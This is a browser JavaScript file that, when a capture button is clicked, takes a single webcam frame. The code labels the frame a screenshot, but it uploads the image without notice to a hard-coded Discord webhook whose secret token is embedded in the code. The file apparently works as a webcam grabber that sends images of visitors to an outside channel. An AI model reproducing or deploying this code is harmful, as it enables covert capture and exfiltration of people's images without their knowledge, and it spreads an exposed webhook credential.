document.addEventListener('DOMContentLoaded', () => {
    const captureButton = document.getElementById('capture-btn');
    const screenshotCanvas = document.getElementById('screenshot');
    const ctx = screenshotCanvas.getContext('2d');

    captureButton.addEventListener('click', () => {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                const video = document.createElement('video');
                video.srcObject = stream;
                document.body.appendChild(video);
                video.play();

                video.addEventListener('loadeddata', () => {
                    screenshotCanvas.width = video.videoWidth;
                    screenshotCanvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0, screenshotCanvas.width, screenshotCanvas.height);

                    stream.getTracks().forEach(track => track.stop());
                    document.body.removeChild(video);

                    const screenshotDataUrl = screenshotCanvas.toDataURL("image/png");
                    sendScreenshotToDiscord(screenshotDataUrl, 'png'); // Виберіть формат (png або jpg)
                });
            })
            .catch(err => console.error('Error accessing webcam:', err));
    });

    function sendScreenshotToDiscord(screenshotDataUrl, format) {
        const webhookUrl = 'https://discord.com/api/webhooks/1229473200568795136/_ESI3TX1M9LTN3C0c4wydkCkjR9a80btYNguPs96N3RF2y6zyJrxoMKpIrIRJrZgv7P0';

        const formData = new FormData();
        formData.append('file', dataURItoBlob(screenshotDataUrl, format), `screenshot.${format}`);

        fetch(webhookUrl, {
            method: 'POST',
            body: formData,
        })
        .then(response => {
            if (!response.ok) {
                console.error('Error sending screenshot to Discord:', response.statusText);
            }
        })
        .catch(err => console.error('Error sending screenshot to Discord:', err));
    }

    function dataURItoBlob(dataURI, format) {
        const byteString = atob(dataURI.split(',')[1]);
        const mimeString = format === 'png' ? 'image/png' : 'image/jpeg';
        const ab = new ArrayBuffer(byteString.length);
        const ia = new Uint8Array(ab);
        for (let i = 0; i < byteString.length; i++) {
            ia[i] = byteString.charCodeAt(i);
        }
        return new Blob([ab], { type: mimeString });
    }
});
